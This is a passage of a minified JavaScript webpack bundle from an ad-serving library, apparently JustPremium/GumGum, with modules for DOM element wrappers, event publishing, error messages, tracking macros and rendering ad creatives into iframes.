    var n = a(r(4)),
      o = a(r(13)),
      i = a(r(1));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      l = i.default.getTopScope(),
      d = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          r = r || {};
          var o = n,
            i = {};
          return o._validateConstructorArguments(r), c.set(o, i), i.di = r.di || {}, o._tag = r.tag, o._attributes = r.attributes || {}, o._properties = r.properties || {}, o._events = r.events || {}, o._preId = r.preId || !1, n;
        }
        return s(t, e), t.prototype._createDOMElement = function (e, t, r, n, i, a) {
          var s = this,
            l = c.get(s),
            d = e.document,
            u = void 0;
          return s._preId && (u = e.document.querySelector("#" + s._preId), s._prerendered = !!u), u = u || d.createElement(r), i.content && s._writeContent(i, r), "iframe" === r.toLowerCase() && (l.cancelFixIframe = o.default.fixIframeMouseMove(u, n.src)), Object.keys(a).forEach(function (e, t) {
            u.addEventListener(e, a[e].listener, a[e].useCapture);
          }), Object.keys(n).forEach(function (e, t) {
            n[e] && u.setAttribute(e, n[e]);
          }), Object.keys(i).forEach(function (e, t) {
            u[e] = i[e];
          }), u.setAttribute("jpx-object-id", t), s._el = u, s;
        }, t.prototype._writeContent = function (e, t) {
          var r = this,
            n = e.content;
          switch (delete e.content, t.toLowerCase()) {
            case "iframe":
              r.subscribe("afterAppend", function (t) {
                if (r.isPrerendered() && e.jpxApi) {
                  var o = r._el;
                  (o.contentWindow || o).jpxApi = l[e.jpxApi];
                } else {
                  var i = t[0].getDOMElement(),
                    a = i.contentDocument || i.contentWindow && i.contentWindow.document;
                  a.open();
                  try {
                    a.write('<html><head><style type="text/css">html,body{padding:0;margin:0;background-color:transparent;overflow:hidden;}</style></head><body>' + (n || "") + "</body>");
                  } catch (e) {
                    console.log(e);
                  }
                  a.close();
                }
              });
              break;
            default:
              n && (r._isRendered ? r._el.innerHTML = n : r.subscribe("render", function () {
                r._el.innerHTML = n;
              }));
          }
        }, t.prototype._validateConstructorArguments = function (e) {
          var t = this,
            r = e.di || {};
          if (!e.tag) throw t.error(102, {
            class: t.constructor.name,
            property: "options.tag",
            method: "construct"
          });
          if (!r.window) throw t.error(102, {
            class: t.constructor.name,
            property: "options.di.window",
            method: "construct"
          });
          return t;
        }, t.prototype.addClass = function (e) {
          for (var t = this, r = ((t._el ? t._el.getAttribute("class") : t._attributes.class) || "").trim().split(" "), n = r.length, o = -1, i = 0; i < n; i++) r[i] === e && (o = i);
          -1 === o && (r.push(e), t._attributes.class = r.join(" "), t._isRendered && t._el.setAttribute("class", r.join(" ")));
        }, t.prototype.destroy = function () {
          var e = this,
            t = c.get(e);
          return e._destroyed || (t.cancelFixIframe && t.cancelFixIframe(), e._el && e._el.parentNode && e._el.parentNode.removeChild(e._el), e._destroyed = !0), e;
        }, t.prototype.getDOMElement = function (e) {
          var t = this._el;
          if (!this._el) return !1;
          if ("iframe" === t.tagName.toLocaleLowerCase()) {
            var r = t.contentDocument || (t.contentWindow ? t.contentWindow.document : null);
            return e && r ? r.querySelector(e) : t;
          }
          return e ? t.querySelector(e) : t;
        }, t.prototype.isPrerendered = function () {
          return this._prerendered;
        }, t.prototype.getAllDOMElements = function (e) {
          var t = this._el;
          if (!this._el) return !1;
          if ("iframe" === t.tagName.toLocaleLowerCase()) {
            var r = t.contentDocument || (t.contentWindow ? t.contentWindow.document : null);
            return e && r ? r.body.querySelectorAll(e) : [t];
          }
          return e ? t.querySelectorAll(e) : [t];
        }, t.prototype.isRendered = function () {
          return this._isRendered;
        }, t.prototype.removeClass = function (e) {
          for (var t = this, r = ((t._el ? t._el.getAttribute("class") : t._attributes.class) || "").trim().split(" "), n = r.length, o = -1, i = 0; i < n; i++) r[i] === e && (o = i);
          o > -1 && (r.splice(o, 1), t._isRendered ? t._el.setAttribute("class", r.join(" ")) : t._attributes.class = r.join(" "));
        }, t.prototype.removeAttribute = function (e) {
          return this._isRendered && this._el.removeAttribute(e), delete this._attributes[e], this;
        }, t.prototype.render = function () {
          var e = this,
            t = c.get(e).di;
          return e._createDOMElement(t.window, e.getId(), e._tag, e._attributes, e._properties, e._events || {}), e._isRendered = !0, e.publish("render", [e, e._el]), e;
        }, t.prototype.setAttribute = function (e, t) {
          return this._isRendered && this._el.setAttribute(e, t), this._attributes[e] = t, this;
        }, t.prototype.setStyle = function (e, t) {
          var r = this;
          if (r._isRendered) o.default.applyStyle(r._el, e, t);else {
            var n = (r._attributes.style || "").search(new RegExp("^" + e + "s{0,}:|;s{0,}" + e + "s{0,}:"));
            if (-1 === n) {
              var i = (r._attributes.style || "").trim(),
                a = !i || ";" == i[i.length - 1];
              r._attributes.style = a ? i + (e + ": ") + t + ";" : i + ";" + e + ": " + t + ";";
            } else {
              var s = (r._attributes.style || "").trim(),
                c = s.substr(0, n) + (0 === n ? "" : ";"),
                l = s.substr(n).replace(/^;\s/, ""),
                d = l.search(";"),
                u = d > -1 ? l.substr(d) : "";
              r._attributes.style = c + (e + ": ") + t + u;
            }
          }
          return r;
        }, t.prototype.transitionEnd = function (e, t) {
          var r = this;
          if (r._isRendered && !r._el) throw r.error(302, {
            property: "_el",
            method: "animEnd",
            class: "JDOMElement"
          });
          return new Promise(function (n) {
            o.default.onTransitionEnd(r._el, function (t) {
              e && e(t), n(t);
            }, t);
          });
        }, t.prototype.transitionOn = function (e) {
          var t = this;
          if (t._isRendered && !t._el) throw t.error(302, {
            property: "_el",
            method: "transitionOn",
            class: "JDOMElement"
          });
          t._el && t._el.offsetHeight;
          return e = e || "jpx-transition", t.addClass(e), t._isRendered && o.default.clearUnresolvedTransitionListeners(t._el), t;
        }, t.prototype.transitionOff = function (e) {
          var t = this;
          if (!t._el) throw t.error(302, {
            property: "_el",
            method: "transitionOff",
            class: "JDOMElement"
          });
          return e = e || "jpx-transition", t.removeClass(e), t._el.offsetHeight, t;
        }, t;
      }(n.default);
    t.default = d;
  },
  419: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = new WeakMap(),
      o = function () {
        function e() {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, e), n.set(this, {
            firedEvents: {},
            listeners: {}
          });
        }
        return e.prototype.publish = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            o = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
            i = n.get(this),
            a = i.listeners[e] || [];
          o || (i.firedEvents[e] = {
            attributes: t,
            delay: r
          }), r ? setTimeout(function () {
            return a.forEach(function (e) {
              return e(t);
            });
          }, parseInt(r)) : a.forEach(function (e) {
            return e(t);
          });
        }, e.prototype.subscribe = function (e, t) {
          var r = this,
            o = n.get(this);
          return (o.listeners[e] ? o.listeners[e] : o.listeners[e] = []).push(t), function () {
            r.removeListener(e, t);
          };
        }, e.prototype.removeListener = function (e, t) {
          var r = n.get(this).listeners[e] || [],
            o = r.indexOf(t);
          o > -1 && r.splice(o, 1);
        }, e.prototype.getListenersCount = function (e) {
          return (n.get(this).listeners[e] || []).length;
        }, e.prototype.destroy = function () {
          n.get(this).listeners = null;
        }, e;
      }();
    t.default = o;
  },
  420: function (e, t) {
    e.exports = {
      100: "In ${class} constructor parameter `${parameter}` should be an instance of ${instance}",
      101: "`${method}` in ${class} is not allowed",
      102: "Passed arguments are incorrect, property `${property}` is missing in method `${method}` from class ${class}",
      103: "${class} was not initialized properly, `${property}` property missing in method `${method}`",
      104: "`${method}` from ${class} should be overridden",
      105: "Passed arguments are incorrect, property `${property}` should by `${type}`",
      106: "Passed argument `${property}` is incorrect, because ${reason}`",
      107: "`${library}` library not found",
      200: "Promise was rejected in ${class}:${method}",
      201: "`${class}`: Rule ${name} can only inherits or extends, cannot do both",
      202: "Cannot find rule ${name}",
      203: "No ad found in creative",
      204: "Creative is empty",
      205: "Execution aborted from creative",
      206: "No ad found in the queue",
      207: "Fallback failed",
      208: "Bootstrap tag error occurred: `${message}`",
      209: "No VAST/VPAID",
      210: "Creative too small",
      211: "Wrong placement",
      212: "Bootstrap tag error. Can't create instance JAM.",
      213: "Wrong zone parameter",
      214: "Firewall issue. Request was block",
      215: "Bootstrap tag error. Can't setup bootstrap execution.",
      216: "Bootstrap tag error. Can't fetch ads.",
      217: "Blocked cross-origin frame",
      220: "SpotX failure",
      221: "Ajax request failed.",
      222: "Wrong adunit id",
      223: "Can not process jPAM task queue",
      224: "VPAID not load IMA adsRequest",
      225: "VPAID was block",
      299: "Reroute to other product",
      300: "Can not find the `${element}` element",
      301: "Element `${name}` already exists in the virtual DOM. Name must be unique.",
      302: "DOM element `${property}` not exists in `${class}`:`${method}`",
      303: "Can not append element to passed parent, object is not an instance of HTMLElement",
      400: "Mobile Skin: There is no `${container}` container set.",
      401: "Product: responsive param missing",
      402: "ProductApi: problem while writing creative to the ad frame",
      900: "Ad execution failed",
      901: "Error occurred while executing init",
      902: "Error occurred while executing `${event}` callback",
      903: "No `${plugin}` plugin found",
      904: "Not enough space for `${product}`.",
      999: "",
      "<!-initialization-errors->": "",
      "<!-execution-errors->": "",
      "<!-dom-errors->": "",
      "<!-product-errors->": "",
      "<!-global-execution->": "",
      "<!-others->": ""
    };
  },
  421: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }(r(1)).default.getTopScope(),
      o = +new Date(),
      i = void 0;
    try {
      i = n.performance;
    } catch (e) {
      i = window.performance;
    }
    var a = {
      now: !(!i || !i.now) ? function () {
        return i.now();
      } : function () {
        return +new Date() - o;
      },
      format: function (e) {
        var t = function (e, t) {
            for (var r = "", n = (t = t || 2) - 1; n > 0; n--) e < Math.pow(10, n) && (r += "0");
            return (e < Math.pow(10, t - 1) ? r : "") + e;
          },
          r = e % 1e3,
          n = (e = (e - r) / 1e3) % 60;
        return t((e = (e - n) / 60) % 60) + ":" + t(n) + ":" + t(parseFloat(r).toFixed(2), 3);
      }
    };
    t.default = a;
  },
  422: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }(r(1)).default.getTopScope(),
      o = {
        getTracking: function () {
          var e = n.GUMGUM,
            t = e ? e.trackingUrls : null;
          return t && Object.keys(t).map(function (e) {
            try {
              new URL(t[e]);
            } catch (r) {
              t[e] = null;
            }
          }), t;
        },
        sendTracking: function (e) {
          var t = n.GUMGUM,
            r = this.getTracking();
          r && r[e] && t.loadImg(r[e]);
        }
      };
    t.default = o;
  },
  46: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    t.default = {
      returnCreativePath: function (e) {
        for (var t = [/\/hostingTags\/[0-9a-zA-Z_.-]+/g, /\/hostingTags\\\/[0-9a-zA-Z_.-]+/g, /\/adTags\/[0-9a-zA-Z_.-]+/g, /\/adTags\\\/[0-9a-zA-Z_.-]+/g, /\/adcreator\/[0-9a-zA-Z_.-]+/, /\/api\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+/g], r = 0; r < t.length; r++) {
          var n = e.match(t[r]);
          if (n) return n[0];
        }
      },
      getCreativeId: function (e) {
        if (!e) return "";
        var t = this.returnCreativePath(e);
        if (!t) return "";
        var r = t.match(/(\d+)(?!.*\d)+/g);
        return r && (t = r[0]), t;
      },
      getAssetsPath: function (e) {
        var t = "";
        return e && (t = e.match(/https:\/\/justpremium[0-9a-zA-Z_.%-]+\.[0-9a-zA-Z_.%-]+\.[0-9a-zA-Z_.%-]+\.[0-9a-zA-Z_.%-]+\/api\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+\/[0-9a-zA-Z_.%-]+\//)), t;
      },
      isAirtory: function (e) {
        return !!e.match(/airtory/);
      },
      isRich: function (e) {
        return !!e.match(/colorScheme:/);
      },
      isTrackingMacro: function (e) {
        return !!e.match(/\${trackingmacro}/);
      },
      isWeborama: function (e) {
        return !!e.match(/weborama_display_tag:/);
      }
    };
  },
  47: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = d(r(4)),
      o = d(r(13)),
      i = d(r(2)),
      a = d(r(107)),
      s = d(r(1)),
      c = d(r(46)),
      l = d(r(108));
    function d(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function u(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var p = new WeakMap(),
      f = s.default.getTopScope(),
      h = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          return r = r || {}, n._setPrivates(r), n;
        }
        return u(t, e), t.prototype._addAdSafeId = function () {
          var e = p.get(this).di,
            t = e.jDOM,
            r = e.jModel,
            n = r.getData("ssp"),
            o = r.getFormat();
          if (l.default.isAdSafeSupported(o, n) && -1 === l.default.isAdSafeIdAddedInProduct(o)) {
            var i = t.getElement("wrapper");
            i.setAttribute("id", i.getId()), i.addClass("iasId");
          }
        }, t.prototype._addAdSafePixel = function () {
          var e = p.get(this).di,
            t = e.jDOM,
            r = e.jModel,
            n = r.getFormat(),
            o = t.getElement("adframe").getDOMElement(),
            i = o.contentWindow,
            s = a.default.returnFrameInnerHTML(o),
            c = r.getData("ssp"),
            d = !1;
          if (l.default.isAdSafeLoadedFromProduct(n, s) && (d = !0, r.addProperty("loadAdSafeFromProduct", !0)), l.default.isAdSafeAllowed(n, c, s) && !d) {
            var u = "";
            r.getData("trackerId") ? u = r.getData("trackerId") : i.trackerId && (u = i.trackerId);
            var f = {
                iasAdPath: t.getElement("wrapper").getId(),
                format: n,
                html: s,
                chanId: r.getData("zoneId") ? r.getData("zoneId") : "",
                trackerId: u
              },
              h = i.document.body;
            l.default.addAdSafePixel(h, f);
          }
        }, t.prototype._onLoad = function () {
          this._isAirtory(), this._addAdSafePixel();
        }, t.prototype._checkAdFrameSize = function (e, t, r) {
          var n = this;
          return i.default.delay(n, function () {
            var o = e.querySelector(".jcl-tmp-wrapper");
            if (t.jModel.getData("extendTag") && o) {
              var i = function () {
                n._getBiggestElement(o.contentWindow && o.contentWindow.document.body, t), r(null);
              };
              o.contentWindow && o.contentWindow.document && "complete" === o.contentWindow.document.readyState ? i() : o.addEventListener("load", i);
            } else n._getBiggestElement(e, t), r(null);
          }, 16), n;
        }, t.prototype._createBase = function () {
          var e = this.getPrefix(),
            t = p.get(this).di.jDOM;
          return t.createElement("wrapper", {
            tag: "div",
            parent: "@root",
            attributes: {
              class: e + "wrapper",
              style: "height:0; width:0; overflow:hidden;"
            }
          }).createElement("container", {
            tag: "div",
            parent: "wrapper",
            attributes: {
              class: e + "container"
            }
          }).createElement("content", {
            tag: "div",
            parent: "container",
            attributes: {
              class: e + "content"
            }
          }).createElement("ad", {
            tag: "div",
            parent: "content",
            attributes: {
              class: e + "ad"
            }
          }), this;
        }, t.prototype._createFailureFn = function (e) {
          var t = this,
            r = p.get(t);
          try {
            f.ServeBackupAd = window.ServeBackupAd = function () {
              r.canceled = !0, e(t.error(205));
            };
          } catch (e) {
            try {
              console.log("[SEVERE] jpx_0x000000 backup function error"), console.log(e);
            } catch (e) {}
          }
        }, t.prototype._createSuccessFn = function (e, t, r, n) {
          var o = this,
            i = e.getDOMElement(),
            a = p.get(o),
            s = function () {
              o._isExtend(i, n, c, r) || (i.contentWindow.document.getElementsByTagName("gumgum-ad").length && !["wv", "mv", "fv"].includes(a.di.jModel.getFormat()) ? o._waitForConfig(i, c, function (e) {
                return c();
              }) : c());
            },
            c = function () {
              if (o.publish("adframeReady", [o, i.contentWindow]), !a.canceled) {
                var s = e.getDOMElement("body");
                s || (s = e.getDOMElement().contentWindow.document.body), o._checkAdFrameSize(s, n, function (n) {
                  if (n) return r(n);
                  t(e);
                });
              }
            };
          i.contentWindow && i.contentWindow.document && "complete" === i.contentWindow.document.readyState ? s() : i.addEventListener("load", s);
        }, t.prototype._getExtend = function (e) {
          if (e.contentWindow.jpxExtendTag) return e.contentWindow.jpxExtendTag;
          var t = void 0;
          return Array.prototype.slice.call(e.contentWindow.document.querySelectorAll("script")).find(function (e) {
            var r = e.src && e.src.match(/\/extend\/\?zone=([0-9]+)/);
            return !!r && (t = r[1], !0);
          }) && t || !1;
        }, t.prototype._getOldExtend = function (e) {
          var t = Array.prototype.slice.call(e.contentWindow.document.querySelectorAll("script")).filter(function (e) {
            return e.src && e.src.search("extend_tag.js") > -1;
          }).pop();
          if (t) {
            var r = t.src.match(/([0-9]+)-extend_tag\.js/);
            return !!r && r[1];
          }
          return !1;
        }, t.prototype._getPublisherIO = function (e, t) {
          return t ? e.contentWindow.pubIO : e.contentWindow.trackerId;
        }, t.prototype._getBiggestElement = function (e, t) {
          var r = [].concat.apply([], ["div", "iframe", "img"].map(function (t) {
            return Array.prototype.slice.call(e.querySelectorAll(t));
          })).map(function (e) {
            var t = {
              h: e.offsetHeight,
              w: e.offsetWidth
            };
            return t.score = t.h * t.w, t.score = t.score < 1 ? 1 : t.score, t;
          }).sort(function (e, t) {
            return t.score > e.score ? 1 : t.score < e.score ? -1 : 0;
          });
          if (r.length) {
            var n = r[0],
              o = n.h,
              i = n.w;
            o >= 48 && i >= 120 && (t.jModel.addProperty("height", o), t.jModel.addProperty("width", i));
          }
        }, t.prototype._getReqId = function () {
          var e = p.get(this).di,
            t = "";
          try {
            t = e.global.server.ruid;
          } catch (e) {}
          return t;
        }, t.prototype._isAirtory = function () {
          var e = p.get(this),
            t = e.di,
            r = t.jDOM,
            n = t.jModel,
            o = r.getElement("adframe").getDOMElement().contentWindow.document.body.innerHTML;
          c.default.isAirtory(o) && (e.isAirtory = !0, n.addProperty("airtory", !0));
        }, t.prototype._isExtend = function (e, t, r, n) {
          var o = this,
            i = o._getExtend(e) || o._getOldExtend(e);
          if (i) {
            var a = t.jModel;
            return a.addProperty("extendTag", i), e.contentWindow.trackerId ? a.addProperty("trackerId", o._getPublisherIO(e, !1)) : e.contentWindow.pubIO ? a.addProperty("pubIO", o._getPublisherIO(e, !0)) : a.addProperty("pubIO", 0), a.addProperty("campaignId", e.contentWindow.campaignId), a.addProperty("creativeId", e.contentWindow.creativeId), a.addProperty("exchangeId", e.contentWindow.exchangeId), a.addProperty("insertionOrderId", e.contentWindow.insertionOrderId), a.addProperty("dealId", e.contentWindow.dealId), a.addProperty("publisherId", e.contentWindow.publisherId), a.addProperty("sourceUrl", e.contentWindow.sourceUrl), a.addProperty("userDefined", e.contentWindow.userDefined), o.publish("extendExecutionDetected", [o, a]), o._waitForConfig(e, r, n), !0;
          }
          return !1;
        }, t.prototype._prepereTrackingMacro = function () {
          var e = p.get(this).di,
            t = e.jModel.getData(),
            r = +new Date(),
            n = "unknown";
          return f.location.hostname && (n = f.location.protocol ? f.location.protocol + "//" + f.location.hostname : f.location.hostname), "rid=" + e.global.server.ruid + "&sid=" + e.global.server.suid + "&uid=" + (e.global.cmp && e.global.cmp.gdprApprove ? e.global.server.uuid : "") + "&an=" + e.global.server.app + "&vr=v2.44.492&vn=" + (e.global.server.cluster || "") + "&sd=" + e.global.server.subdomain + "&tt=" + r + "&_c=a" + Math.random().toString(36).substring(7) + r + "&zid=" + e.global.server.zone + "&siw=" + e.global.site.width + "&ist=" + t.isTest + "&di=" + (t.dealId || "") + "&sp=" + t.ssp + "&said=" + t.sourceId + "&aid=" + t.adId + "&fc=" + t.format + "&ru=" + encodeURIComponent(n) + "&ty=ck";
        }, t.prototype._setPrivates = function (e) {
          var t = {},
            r = e.di || {};
          return p.set(this, t), t.di = r, t.parent = e.parent, t.parentIdx = e.parentIdx, t.promises = [], t.isAirtory = !1, t;
        }, t.prototype._waitForConfig = function (e, t, r) {
          var n = this,
            o = 500;
          !function a() {
            i.default.delay(n, function () {
              f.jpx_ad_config || e.contentWindow.jpx_ad_config || e.contentWindow.jpxExtendTag ? t && t() : o-- > 0 ? a() : r(new Error("No config found"));
            }, 16);
          }();
        }, t.prototype._writeIframe = function () {
          var e = this,
            t = p.get(e),
            r = t.di,
            n = r.jDOM,
            o = r.jModel,
            i = r.jProductApi,
            a = o.getData(),
            s = o.getFormat(),
            l = i.getId(),
            d = o.getCreative();
          return t.promises.push(new Promise(function (t, i) {
            var u = c.default.isTrackingMacro(d);
            if (u) {
              var p = e._prepereTrackingMacro();
              d = d.replace(u[0], p);
            } else if (o.getData("standaloneAdv")) {
              var h = e._prepereTrackingMacro();
              f.jp_creative_vars && f.jp_creative_vars.clickmacro && (f.jp_creative_vars.clickmacro = f.jp_creative_vars.clickmacro.replace("${trackingmacro}", h));
            }
            var g = 0;
            "cf" === s && (g = 500), "is" !== s && "wp" !== s || !c.default.isWeborama(d) || o.addProperty("weborama", !0), e._addAdSafeId(), ["is", "cf", "mo", "pd"].indexOf(s) > -1 && (d = "<script>var inDapIF=true; window.document.ccformat = '" + s + "';<\/script>" + d), d = '<script> function sendReports(e) { e.forEach(function (e) { var i; "HeavyAdIntervention" === e.body.id && jpxApi && jpxApi.getCreativeID && jpxApi.getFormat && jpxApi.geo && jpxApi.getRid && jpxApi.getZid && (i = JSON.stringify({ cid: jpxApi.getCreativeID() || null, id: e.body.id || null, fc: [jpxApi.getFormat()] || null, ic: jpxApi.geo().isocode || null, rid: jpxApi.getRid() || null, zid: jpxApi.getZid() || null, }), navigator.sendBeacon("https://pre.ads.justpremium.com/v/1.0/t/report",i))})}try{var obs=new ReportingObserver(function(e,i){sendReports(e)},{buffered:!0});obs.observe()}catch(e){} <\/script>' + d, d = "<script>var currWindow;try{currWindow = window.top;let test = currWindow.location.href;}catch(e){currWindow = window;}var jpxApi = currWindow." + l + ";var jpxRid = '" + e._getReqId() + "';window.jpxOnReady = function(cb){cb(jpxApi)};" + (o.getData("isGumGum") ? "var GUMGUM = GUMGUM || currWindow.GUMGUM;" : "") + "<\/script>" + d + "<script>setTimeout(function(){window.frameElement.$jpxOnLoad();}," + g + ");<\/script>", e._createFailureFn(i);
            var v = n.getElement("adframe", {
              tag: "iframe",
              parent: "ad",
              attributes: {
                class: e.getPrefix() + "ad-frame",
                frameBorder: "0",
                ccformat: s
              },
              events: {
                error: {
                  listener: function (e) {
                    return i(e);
                  }
                }
              },
              properties: {
                jpxApi: l,
                content: d,
                $jpxOnLoad: function () {
                  e._onLoad();
                }
              }
            });
            if (a.prerendered) {
              var m = v.getDOMElement();
              m.contentWindow && m.contentWindow.document && "complete" === m.contentWindow.document.readyState ? e._onLoad() : m.addEventListener("load", function () {
                e._onLoad();
              });
            }
            e._createSuccessFn(v, t, i, r);
          })), e;
        }, t.prototype.bindToJDOM = function (e, t, r) {
          return p.get(this).di.jDOM.bind(e, t, r);
        }, t.prototype.destroy = function () {
          var t = p.get(this);
          t && (p.set(this, null), t && (t.di.jDOM.destroy(), t.di.jDOM = null, t.di.jModel = null, t.promises.length = 0, t.parent = null, this.isDestroyed = !0, e.prototype.destroy.call(this)));
        }, t.prototype.getPrefix = function () {
          return "jpx-" + p.get(this).di.jModel.getFormat() + "-";
        }, t.prototype.getJDOMElement = function (e) {
          return p.get(this).di.jDOM.getElement(e);
        }, t.prototype.ready = function () {
          var e = this,
            t = p.get(e);
          return t.ready || (t.ready = Promise.all(p.get(e).promises).then(function (t) {
            return e.publish("adFrameReady", [e]), t;
          }).catch(function (t) {
            throw e.publish("adFrameError", [t]), t;
          }));
        }, t.prototype.render = function () {
          var e = this,
            t = p.get(e),
            r = t.di.jDOM;
          return e._createBase(), r.renderDOM(), e.publish("afterDOMRender", [e, r, t]), void 0 !== t.parentIdx ? r.appendTo(t.parent, t.parentIdx) : r.appendTo(t.parent), e._writeIframe(), e.publish("afterRender", [e, r]), e;
        }, t.prototype.setInsertAt = function (e, t) {
          if (t) {
            var r = o.default.getParentAndIndex(e, t);
            this.setParent(r.parent, r.index);
          } else this.setParent(e);
        }, t.prototype.setParent = function (e, t) {
          var r = p.get(this);
          return r.parent = e, r.parentIdx = t, this;
        }, t.prototype.show = function () {
          var e = p.get(this).di,
            t = e.jDOM,
            r = e.jModel;
          return r.getData("width") > 0 && r.getData("height") > 0 ? (t.getElement("wrapper").setStyle("height", ""), t.getElement("wrapper").setStyle("width", ""), t.getElement("wrapper").setStyle("overflow", "")) : (t.getElement("wrapper").setStyle("height", "0px"), t.getElement("wrapper").setStyle("width", "0px")), this;
        }, t;
      }(n.default);
    t.default = h;
  },
  52: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(32)),
      o = i(r(1));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var s = new WeakMap(),
      c = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            o = n,
            i = {};
          return s.set(o, i), i.di = r.di, n;
        }
        return a(t, e), t.prototype._createBase = function () {
          s.get(this).di.jDOM.createElement("close", {
            tag: "div",
            attributes: {
              class: this.getPrefix() + "close"
            },
            parent: "@root[1]"
          }).createElement("close-img", {
            tag: "span",
            parent: "close"
          });
        }, t.prototype._productApiSupport = function () {
          var e = s.get(this).di.jDOM;
          s.get(this).di.jModel.getData("hideCloseButton") && -1 !== e.getElement("close") && e.removeElement("close");
        }, t.prototype._show = function () {
          var e = s.get(this).di;
          return e.jStyle.apply(), e.jAdFrame.show(), this;
        }, t.prototype.appendTo = function () {
          var t = s.get(this).di.jAdFrame;
          return e.prototype.appendTo.call(this, [t.getJDOMElement("wrapper").getDOMElement(), t.getJDOMElement("container").getDOMElement()]), this;
        }, t.prototype.bindEvents = function () {
          var e = this;
          s.get(e).di.jDOM.bind("close", "click", function () {
            e.hide();
          });
        }, t.prototype.bindGumGumEvents = function () {
          var e = s.get(this).di,
            t = e.jAdFrame,
            r = (e.jModel, e.jTracking);
          if (r && !o.default.isMobile()) var n = t.bindToJDOM("wrapper", "mouseenter", function () {
            n(), r.loadGumGumPixel("hoverUrl");
          });
        }, t.prototype.hide = function () {
          var e = this;
          return s.get(e).di.jAdFrame.getJDOMElement("wrapper").setStyle("display", "none"), e.publish("afterHide", [e]), e.destroy(), e;
        }, t.prototype.setup = function () {
          this._createBase(), this._productApiSupport();
        }, t;
      }(n.default);
    t.default = c;
  },
  59: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(1));
    var o = n.default.getTopScope(),
      i = {
        isPortrait: function () {
          var e = !0;
          return n.default.isTablet() && n.default.isSafari() ? o.screen.height < o.screen.width && (e = !1) : o.innerHeight < o.innerWidth && (e = !1), this._isPortrait = e;
        }
      };
    t.default = i;
  },
  6: function (e, t) {
    e.exports = function () {
      var e = [];
      return e.toString = function () {
        for (var e = [], t = 0; t < this.length; t++) {
          var r = this[t];
          r[2] ? e.push("@media " + r[2] + "{" + r[1] + "}") : e.push(r[1]);
        }
        return e.join("");
      }, e.i = function (t, r) {
        "string" == typeof t && (t = [[null, t, ""]]);
        for (var n = {}, o = 0; o < this.length; o++) {
          var i = this[o][0];
          "number" == typeof i && (n[i] = !0);
        }
        for (o = 0; o < t.length; o++) {
          var a = t[o];
          "number" == typeof a[0] && n[a[0]] || (r && !a[2] ? a[2] = r : r && (a[2] = "(" + a[2] + ") and (" + r + ")"), e.push(a));
        }
      }, e;
    };
  },
